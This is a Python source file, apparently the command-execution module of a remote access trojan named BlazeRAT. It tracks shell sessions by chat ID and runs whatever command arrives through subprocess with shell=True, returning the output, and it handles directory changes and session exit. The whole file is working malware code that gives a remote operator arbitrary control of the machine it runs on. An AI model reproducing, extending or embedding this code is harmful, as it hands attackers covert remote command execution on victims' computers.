#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from core.logger import Log
from os import chdir, getcwd, path
from subprocess import Popen, PIPE
from core.messages import services as Messages

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed
    to execute system commands
"""

# Shell sessions users
global sessions
sessions = []

""" Is shell session exists """
def SessionExists(chatid: int) -> bool:
    global sessions
    return chatid in sessions

""" Toggle session """
def ToggleSession(chatid: int) -> str:
    global sessions
    if SessionExists(chatid):
        sessions.remove(chatid)
        Log("Shell >> Session closed", chatid)
        return Messages.shell_session_closed
    else:
        sessions.append(chatid)
        Log("Shell >> Session opened", chatid)
        return Messages.shell_session_opened

""" Run system command """
def System(command: str) -> str:
    try:
        shell = Popen(command[:], shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
        output = str(shell.stdout.read() + shell.stderr.read(), "utf-8")
    except Exception as error:
        return str(error)
    else:
        return output

""" Change directory """
def ChangeDir(dir: str) -> str:
    abs = path.abspath(dir)
    try:
        chdir(dir)
    except FileNotFoundError:
        return Messages.shell_chdir_not_found % abs
    except NotADirectoryError:
        return Messages.shell_chdir_not_a_dir % abs
    except Exception as error:
        return Messages.shell_chdir_failed % (error, abs)
    else:
        return Messages.shell_chdir_success % abs

""" Get current directory """
def Pwd() -> str:
    pwd = path.abspath(getcwd())
    return Messages.shell_pwd_success % pwd

""" Execute shell command """
def Run(command: str, chatid: int) -> str:
    Log(f"Shell >> Run command {command}", chatid)
    # Skip empty command
    if len(command) < 2:
        return Messages.shell_command_is_empty
    # Change working directory
    if command[:2] == "cd":
        return ChangeDir(command[3:])
    # Get current directory
    elif command[:3] == "pwd":
        return Pwd()
    # Exit command
    elif command[:4] == "exit":
        return ToggleSession(chatid)
    # Execute system command
    elif len(command) > 0:
        output = System(command)
        return Messages.shell_command_executed % output
